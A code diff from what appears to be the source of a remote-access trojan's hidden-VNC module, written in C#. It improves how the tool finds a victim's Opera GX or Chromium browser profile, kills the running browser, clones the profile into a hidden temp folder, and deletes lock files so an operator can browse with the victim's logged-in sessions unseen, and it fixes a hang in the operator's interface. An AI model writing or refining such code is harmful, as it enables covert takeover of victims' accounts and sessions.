@@ -2128,10 +2128,16 @@ internal static class HvncFeature
                 string hvncDirName = isOperaGX ? "operagx" : Path.GetFileNameWithoutExtension(exeBase);
                 string hvncProfile = Path.Combine(Path.GetTempPath(), "SeroHvnc", hvncDirName);
 
-                string? realProfile = isOperaGX
-                    ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                                   "Opera Software", "Opera GX Stable")
-                    : GetChromiumRealProfile(exeBase);
+                // Opera GX profile can be in %AppData% or %LocalAppData% depending on install type.
+                string? realProfile;
+                if (isOperaGX)
+                {
+                    string gxRoam  = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),      "Opera Software", "Opera GX Stable");
+                    string gxLocal = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Opera Software", "Opera GX Stable");
+                    realProfile = Directory.Exists(gxRoam) ? gxRoam : gxLocal;
+                }
+                else
+                    realProfile = GetChromiumRealProfile(exeBase);
                 if (cloneBrowser && realProfile != null && Directory.Exists(realProfile))
                 {
                     KillAndWaitForExit(exeBase, 3000);
@@ -2160,7 +2166,9 @@ internal static class HvncFeature
                         Thread.Sleep(200);
                     }
                     try { Directory.CreateDirectory(hvncProfile); } catch { }
-                    if (!cloneBrowser) SendHvncProgress(100, "");
+                    // Always notify: covers both no-clone sessions and clone requests where the real
+                    // profile is missing (browser not installed) — without this the UI spinner hangs.
+                    SendHvncProgress(100, "");
                 }
                 foreach (var lk in new[] { "SingletonLock", "SingletonSocket", "SingletonCookie" })
                 {
@@ -2230,7 +2238,9 @@ internal static class HvncFeature
                         Thread.Sleep(200);
                     }
                     try { Directory.CreateDirectory(hvncProfile); } catch { }
-                    if (!cloneBrowser) SendHvncProgress(100, "");
+                    // Always notify: covers both no-clone sessions and clone requests where the real
+                    // profile is missing (browser not installed) — without this the UI spinner hangs.
+                    SendHvncProgress(100, "");
                 }
                 foreach (var lk in new[] { "parent.lock", "lock" })
                     try { File.Delete(Path.Combine(hvncProfile, lk)); } catch { }
